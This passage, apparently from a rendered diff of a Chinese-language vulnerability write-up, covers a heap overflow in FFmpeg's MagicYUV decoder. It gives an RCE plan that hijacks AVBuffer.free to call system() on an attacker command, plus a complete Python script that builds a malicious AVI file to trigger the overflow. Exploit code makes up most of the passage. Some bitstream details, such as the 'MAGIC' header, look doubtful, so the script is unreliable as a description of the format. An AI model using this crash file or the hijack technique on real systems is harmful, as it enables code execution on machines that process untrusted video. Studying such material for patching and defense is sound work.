+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="nt">OOB写入区域</span><span class="w"> </span><span class="o">(</span><span class="nt">640字节攻击者控制的数据</span><span class="o">)</span><span class="w">                     </span><span class="err">│</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">                                                          </span><span class="err">│</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="o">+</span><span class="nt">0</span><span class="o">:</span><span class="w">    </span><span class="cp">[</span><span class="mi">88</span><span class="nx">字节零填充</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">命令字符串空间</span><span class="cp">]</span><span class="w">                   </span><span class="err">│</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="o">+</span><span class="nt">88</span><span class="o">:</span><span class="w">  </span><span class="cp">[</span><span class="nx">glibc</span><span class="w"> </span><span class="nx">chunk</span><span class="w"> </span><span class="nx">headers</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">必须原样保留</span><span class="cp">]</span><span class="w">              </span><span class="err">│</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="o">+</span><span class="nt">256</span><span class="o">:</span><span class="w"> </span><span class="nt">AVBuffer结构体</span><span class="o">:</span><span class="w">                                   </span><span class="err">│</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">         </span><span class="p">.</span><span class="nc">data</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="nt">Cb_data指针</span><span class="w">                          </span><span class="err">│</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">         </span><span class="p">.</span><span class="nc">size</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="nt">0x284f</span><span class="w">                               </span><span class="err">│</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">         </span><span class="p">.</span><span class="nc">refcount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">1</span><span class="w">  </span><span class="err">←</span><span class="w"> </span><span class="nt">攻击者写入1</span><span class="w">                     </span><span class="err">│</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">         </span><span class="p">.</span><span class="nc">free</span><span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="nt">system</span><span class="w">  </span><span class="err">←</span><span class="w"> </span><span class="nt">攻击者覆写</span><span class="o">!</span><span class="w">               </span><span class="err">│</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">         </span><span class="p">.</span><span class="nc">opaque</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="nt">cmd_string</span><span class="w"> </span><span class="err">←</span><span class="w"> </span><span class="nt">攻击者覆写</span><span class="o">!</span><span class="w">            </span><span class="err">│</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="o">+</span><span class="nt">384</span><span class="o">:</span><span class="w"> </span><span class="nt">AVBufferRef</span><span class="p">.</span><span class="nc">buffer</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="nt">指向</span><span class="o">+</span><span class="nt">256处的AVBuffer</span><span class="w">         </span><span class="err">│</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└──────────────────────────────────────────────────────────┘</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">触发流程</span><span class="o">:</span><span class="w">                                                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">1</span><span class="o">.</span><span class="w"> </span><span class="nt">解码完成</span><span class="err">，</span><span class="nt">FFmpeg调用av_frame_unref</span><span class="o">()</span><span class="nt">释放帧</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">2</span><span class="o">.</span><span class="w"> </span><span class="nt">av_frame_unref</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="nt">av_buffer_unref</span><span class="w"> </span><span class="o">(</span><span class="nt">buffer</span><span class="p">.</span><span class="nc">c</span><span class="p">:</span><span class="nd">133</span><span class="o">)</span><span class="w">             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">3</span><span class="o">.</span><span class="w"> </span><span class="nt">refcount减1</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="nt">0</span><span class="o">,</span><span class="w"> </span><span class="nt">触发释放回调</span><span class="o">:</span><span class="w">                               </span><span class="err">│</span>
+<span class="err">│</span><span class="w">     </span><span class="nt">buf-</span><span class="o">&gt;</span><span class="nt">free</span><span class="o">(</span><span class="nt">buf-</span><span class="o">&gt;</span><span class="nt">opaque</span><span class="o">,</span><span class="w"> </span><span class="nt">buf-</span><span class="o">&gt;</span><span class="nt">data</span><span class="o">);</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">     </span><span class="err">↓</span><span class="w"> </span><span class="nt">被劫持后变为</span><span class="o">:</span><span class="w">                                              </span><span class="err">│</span>
+<span class="err">│</span><span class="w">     </span><span class="nt">system</span><span class="o">(</span><span class="nt">cmd_string</span><span class="o">);</span><span class="w">  </span><span class="err">←</span><span class="w"> </span><span class="nt">执行攻击者的shell命令</span><span class="o">!</span><span class="w">                </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">4</span><span class="o">.</span><span class="w"> </span><span class="nt">RCE达成</span><span class="w">                                                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">关键挑战</span><span class="o">:</span><span class="w">                                                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">-</span><span class="w"> </span><span class="nt">OOB区域包含33个glibc</span><span class="w"> </span><span class="nt">chunk</span><span class="w"> </span><span class="nt">metadata</span><span class="w"> </span><span class="nt">qword</span><span class="w">                    </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">-</span><span class="w"> </span><span class="nt">任何一个被破坏</span><span class="err">，</span><span class="nt">glibc完整性检查会在av_buffer_unref之前abort</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">-</span><span class="w"> </span><span class="nt">利用必须原样保留所有chunk</span><span class="w"> </span><span class="nt">metadata</span><span class="w">                             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">-</span><span class="w"> </span><span class="nt">需要ASLR禁用</span><span class="w"> </span><span class="o">(</span><span class="nt">setarch</span><span class="w"> </span><span class="nt">x86_64</span><span class="w"> </span><span class="nt">-R</span><span class="o">)</span><span class="w"> </span><span class="nt">或配合信息泄露漏洞</span><span class="w">           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">└──────────────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<h3>3.5 恶意视频文件构造方法</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">CVE-2026-8461 (PixelSmash) 恶意AVI文件构造工具</span>
+<span class="sd">构造一个触发MagicYUV解码器堆溢出的AVI文件</span>
+
+<span class="sd">注意: 此工具仅构造触发崩溃的文件，不包含RCE利用payload。</span>
+<span class="sd">完整利用需要: ASLR绕过 + 精确堆布局 + glibc metadata保留。</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">io</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">BinaryIO</span>
+
+<span class="c1"># MagicYUV FourCC</span>
+<span class="n">MAGICYUV_FOURCC</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;M8Y0&#39;</span>  <span class="c1"># MagicYUV YUV420P</span>
+<span class="n">MAGICYUV_VERSION</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="c1"># 漏洞触发参数</span>
+<span class="n">CODED_WIDTH</span> <span class="o">=</span> <span class="mi">1280</span>
+<span class="n">CODED_HEIGHT</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="n">SLICE_HEIGHT</span> <span class="o">=</span> <span class="mi">31</span>  <span class="c1"># 奇数! 触发天花板舍入不一致</span>
+<span class="c1"># 分配器: chroma_rows = ceil(32/2) = 16</span>
+<span class="c1"># 解码器: sheight = ceil(31/2) = 16, 2个slice = 32行 → 溢出16行</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">write_avi_chunk</span><span class="p">(</span><span class="n">f</span><span class="p">:</span> <span class="n">BinaryIO</span><span class="p">,</span> <span class="n">fourcc</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;写入AVI chunk&quot;&quot;&quot;</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">fourcc</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># 对齐填充</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">construct_magicyuv_bitstream</span><span class="p">(</span><span class="n">width</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">height</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> 
+                                  <span class="n">slice_height</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    构造MagicYUV码流</span>
+<span class="sd">    关键: slice_height设置为奇数(31)，触发色度平面高度计算不一致</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">bs</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">()</span>
+
+    <span class="c1"># MagicYUV头</span>
+    <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;MAGIC&#39;</span><span class="p">)</span>  <span class="c1"># Magic标识</span>
+    <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;B&#39;</span><span class="p">,</span> <span class="n">MAGICYUV_VERSION</span><span class="p">))</span>  <span class="c1"># 版本</span>
+
+    <span class="c1"># 编解码器标志 (raw模式，便于直接控制写入数据)</span>
+    <span class="c1"># 0 = raw, 1 = Huffman, 2 = Left</span>
+    <span class="n">codec_flag</span> <span class="o">=</span> <span class="mi">0</span>  <span class="c1"># raw模式</span>
+    <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;B&#39;</span><span class="p">,</span> <span class="n">codec_flag</span><span class="p">))</span>
+
+    <span class="c1"># 像素格式 (YUV420P = 0)</span>
+    <span class="n">pixel_format</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;B&#39;</span><span class="p">,</span> <span class="n">pixel_format</span><span class="p">))</span>
+
+    <span class="c1"># 隔行扫描标志 (0 = 非隔行 → 跳过对齐检查!)</span>
+    <span class="n">interlaced</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;B&#39;</span><span class="p">,</span> <span class="n">interlaced</span><span class="p">))</span>
+
+    <span class="c1"># 帧尺寸</span>
+    <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">width</span><span class="p">))</span>   <span class="c1"># coded_width = 1280</span>
+    <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">height</span><span class="p">))</span>  <span class="c1"># coded_height = 32</span>
+
+    <span class="c1"># slice高度 - 漏洞触发点!</span>
+    <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">slice_height</span><span class="p">))</span>  <span class="c1"># 31 (奇数!)</span>
+
+    <span class="c1"># 色度移位因子 (YUV420P: vshift[0]=0, vshift[1]=1)</span>
+    <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;B&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>  <span class="c1"># vshift[0]</span>
+    <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;B&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>  <span class="c1"># vshift[1]</span>
+
+    <span class="c1"># 计算slice数量</span>
+    <span class="n">nb_slices</span> <span class="o">=</span> <span class="p">(</span><span class="n">height</span> <span class="o">+</span> <span class="n">slice_height</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="n">slice_height</span>  <span class="c1"># 2</span>
+
+    <span class="c1"># 为每个slice写入数据</span>
+    <span class="c1"># Y平面: width * slice_height 字节 (raw模式)</span>
+    <span class="c1"># U平面: width/2 * ceil(slice_height/2) 字节</span>
+    <span class="c1"># V平面: 同U平面</span>
+
+    <span class="n">y_plane_size</span> <span class="o">=</span> <span class="n">width</span> <span class="o">*</span> <span class="n">slice_height</span>
+    <span class="n">chroma_width</span> <span class="o">=</span> <span class="n">width</span> <span class="o">//</span> <span class="mi">2</span>
+    <span class="n">chroma_slice_height</span> <span class="o">=</span> <span class="p">(</span><span class="n">slice_height</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>  <span class="c1"># ceil(31/2) = 16</span>
+    <span class="n">chroma_plane_size</span> <span class="o">=</span> <span class="n">chroma_width</span> <span class="o">*</span> <span class="n">chroma_slice_height</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">nb_slices</span><span class="p">):</span>
+        <span class="c1"># 计算这个slice实际需要处理的行数</span>
+        <span class="n">remaining</span> <span class="o">=</span> <span class="n">height</span> <span class="o">-</span> <span class="n">i</span> <span class="o">*</span> <span class="n">slice_height</span>
+        <span class="n">actual_rows</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">slice_height</span><span class="p">,</span> <span class="n">remaining</span><span class="p">)</span>
+        <span class="n">actual_chroma_rows</span> <span class="o">=</span> <span class="p">(</span><span class="n">actual_rows</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+
+        <span class="c1"># Y平面数据</span>
+        <span class="n">y_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">width</span> <span class="o">*</span> <span class="n">actual_rows</span><span class="p">)</span>
+        <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">y_data</span><span class="p">)))</span>
+        <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">y_data</span><span class="p">)</span>
+
+        <span class="c1"># U平面数据 (第二个slice的写入将超出缓冲区)</span>
+        <span class="n">u_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">chroma_width</span> <span class="o">*</span> <span class="n">actual_chroma_rows</span><span class="p">)</span>
+        <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">u_data</span><span class="p">)))</span>
+        <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">u_data</span><span class="p">)</span>
+
+        <span class="c1"># V平面数据</span>
+        <span class="n">v_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">chroma_width</span> <span class="o">*</span> <span class="n">actual_chroma_rows</span><span class="p">)</span>
+        <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">v_data</span><span class="p">)))</span>
+        <span class="n">bs</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">v_data</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">bs</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">construct_malicious_avi</span><span class="p">(</span><span class="n">output_path</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;构造恶意AVI文件&quot;&quot;&quot;</span>
+
+    <span class="c1"># 构造MagicYUV码流</span>
+    <span class="n">bitstream</span> <span class="o">=</span> <span class="n">construct_magicyuv_bitstream</span><span class="p">(</span>
+        <span class="n">width</span><span class="o">=</span><span class="n">CODED_WIDTH</span><span class="p">,</span>
+        <span class="n">height</span><span class="o">=</span><span class="n">CODED_HEIGHT</span><span class="p">,</span>
+        <span class="n">slice_height</span><span class="o">=</span><span class="n">SLICE_HEIGHT</span>
+    <span class="p">)</span>
+
+    <span class="c1"># AVI文件结构</span>
+    <span class="n">avi</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">()</span>
+
+    <span class="c1"># RIFF头</span>
+    <span class="n">avi</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;RIFF&#39;</span><span class="p">)</span>
+    <span class="n">avi</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>  <span class="c1"># 文件大小(后续填充)</span>
+    <span class="n">avi</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;AVI &#39;</span><span class="p">)</span>
+
+    <span class="c1"># LIST &#39;hdrl&#39; (头部列表)</span>
+    <span class="n">hdrl</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">()</span>
+
+    <span class="c1"># avih (主AVI头)</span>
+    <span class="n">avih_data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;IIIIIIIIIIIIII&#39;</span><span class="p">,</span>
+        <span class="mi">33333</span><span class="p">,</span>       <span class="c1"># dwMicroSecPerFrame (30fps)</span>
+        <span class="mi">0</span><span class="p">,</span>           <span class="c1"># dwMaxBytesPerSec</span>
+        <span class="mi">0</span><span class="p">,</span>           <span class="c1"># dwPaddingGranularity</span>
+        <span class="mh">0x10</span><span class="p">,</span>        <span class="c1"># dwFlags (AVIF_HASINDEX)</span>
+        <span class="mi">1</span><span class="p">,</span>           <span class="c1"># dwTotalFrames</span>
+        <span class="mi">0</span><span class="p">,</span>           <span class="c1"># dwInitialFrames</span>
+        <span class="mi">1</span><span class="p">,</span>           <span class="c1"># dwStreams</span>
+        <span class="mi">65536</span><span class="p">,</span>       <span class="c1"># dwSuggestedBufferSize</span>
+        <span class="n">CODED_WIDTH</span><span class="p">,</span> <span class="c1"># dwWidth</span>
+        <span class="n">CODED_HEIGHT</span><span class="p">,</span><span class="c1"># dwHeight</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span>   <span class="c1"># dwReserved[4]</span>
+    <span class="p">)</span>
+    <span class="n">write_avi_chunk</span><span class="p">(</span><span class="n">hdrl</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;avih&#39;</span><span class="p">,</span> <span class="n">avih_data</span><span class="p">)</span>
+
+    <span class="c1"># LIST &#39;strl&#39; (流列表)</span>
+    <span class="n">strl</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">()</span>
+
+    <span class="c1"># strh (流头)</span>
+    <span class="n">strh_data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;4s4sIHHIIIIIIHHHH&#39;</span><span class="p">,</span>
+        <span class="sa">b</span><span class="s1">&#39;vids&#39;</span><span class="p">,</span>          <span class="c1"># fccType</span>
+        <span class="n">MAGICYUV_FOURCC</span><span class="p">,</span>  <span class="c1"># fccHandler (MagicYUV)</span>
+        <span class="mi">0</span><span class="p">,</span>                <span class="c1"># dwFlags</span>
+        <span class="mi">0</span><span class="p">,</span>                <span class="c1"># wPriority</span>
+        <span class="mi">0</span><span class="p">,</span>                <span class="c1"># wLanguage</span>
+        <span class="mi">0</span><span class="p">,</span>                <span class="c1"># dwInitialFrames</span>
+        <span class="mi">1</span><span class="p">,</span>                <span class="c1"># dwScale</span>
+        <span class="mi">30</span><span class="p">,</span>               <span class="c1"># dwRate (30fps)</span>
+        <span class="mi">0</span><span class="p">,</span>                <span class="c1"># dwStart</span>
+        <span class="mi">1</span><span class="p">,</span>                <span class="c1"># dwLength</span>
+        <span class="mi">65536</span><span class="p">,</span>            <span class="c1"># dwSuggestedBufferSize</span>
+        <span class="mh">0xFFFFFFFF</span><span class="p">,</span>       <span class="c1"># dwQuality</span>
+        <span class="mi">0</span><span class="p">,</span>                <span class="c1"># dwSampleSize</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span>           <span class="c1"># rcFrame</span>
+    <span class="p">)</span>
+    <span class="n">write_avi_chunk</span><span class="p">(</span><span class="n">strl</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;strh&#39;</span><span class="p">,</span> <span class="n">strh_data</span><span class="p">)</span>
+
+    <span class="c1"># strf (流格式 - BITMAPINFOHEADER)</span>
+    <span class="n">strf_data</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;IiiHHIIiiII&#39;</span><span class="p">,</span>
+        <span class="mi">40</span><span class="p">,</span>              <span class="c1"># biSize</span>
+        <span class="n">CODED_WIDTH</span><span class="p">,</span>     <span class="c1"># biWidth</span>
+        <span class="n">CODED_HEIGHT</span><span class="p">,</span>    <span class="c1"># biHeight</span>
+        <span class="mi">1</span><span class="p">,</span>               <span class="c1"># biPlanes</span>
+        <span class="mi">24</span><span class="p">,</span>              <span class="c1"># biBitCount</span>
+        <span class="c1"># MagicYUV FourCC作为biCompression</span>
+        <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">MAGICYUV_FOURCC</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span>
+        <span class="mi">0</span><span class="p">,</span>               <span class="c1"># biSizeImage</span>
+        <span class="mi">0</span><span class="p">,</span>               <span class="c1"># biXPelsPerMeter</span>
+        <span class="mi">0</span><span class="p">,</span>               <span class="c1"># biYPelsPerMeter</span>
+        <span class="mi">0</span><span class="p">,</span>               <span class="c1"># biClrUsed</span>
+        <span class="mi">0</span>                <span class="c1"># biClrImportant</span>
+    <span class="p">)</span>
+    <span class="n">write_avi_chunk</span><span class="p">(</span><span class="n">strl</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;strf&#39;</span><span class="p">,</span> <span class="n">strf_data</span><span class="p">)</span>
+
+    <span class="n">strl_data</span> <span class="o">=</span> <span class="n">strl</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>
+    <span class="n">write_avi_chunk</span><span class="p">(</span><span class="n">hdrl</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;LIST&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;strl&#39;</span> <span class="o">+</span> <span class="n">strl_data</span><span class="p">)</span>
+
+    <span class="n">hdrl_data</span> <span class="o">=</span> <span class="n">hdrl</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>
+    <span class="n">write_avi_chunk</span><span class="p">(</span><span class="n">avi</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;LIST&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;hdrl&#39;</span> <span class="o">+</span> <span class="n">hdrl_data</span><span class="p">)</span>
+
+    <span class="c1"># LIST &#39;movi&#39; (数据列表)</span>
+    <span class="n">movi</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">()</span>
+    <span class="n">write_avi_chunk</span><span class="p">(</span><span class="n">movi</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;00dc&#39;</span><span class="p">,</span> <span class="n">bitstream</span><span class="p">)</span>  <span class="c1"># 压缩视频帧</span>
+    <span class="n">movi_data</span> <span class="o">=</span> <span class="n">movi</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>
+    <span class="n">write_avi_chunk</span><span class="p">(</span><span class="n">avi</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;LIST&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;movi&#39;</span> <span class="o">+</span> <span class="n">movi_data</span><span class="p">)</span>
+
+    <span class="c1"># 修复RIFF文件大小</span>
+    <span class="n">avi_data</span> <span class="o">=</span> <span class="n">avi</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>
+    <span class="n">file_size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">avi_data</span><span class="p">)</span> <span class="o">-</span> <span class="mi">8</span>
+    <span class="n">avi_data</span> <span class="o">=</span> <span class="n">avi_data</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">file_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">avi_data</span><span class="p">[</span><span class="mi">8</span><span class="p">:]</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_path</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">avi_data</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] 恶意AVI文件已生成: </span><span class="si">{</span><span class="n">output_path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    文件大小: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">avi_data</span><span class="p">)</span><span class="si">}</span><span class="s2"> 字节&quot;</span><span class="p">)</span>
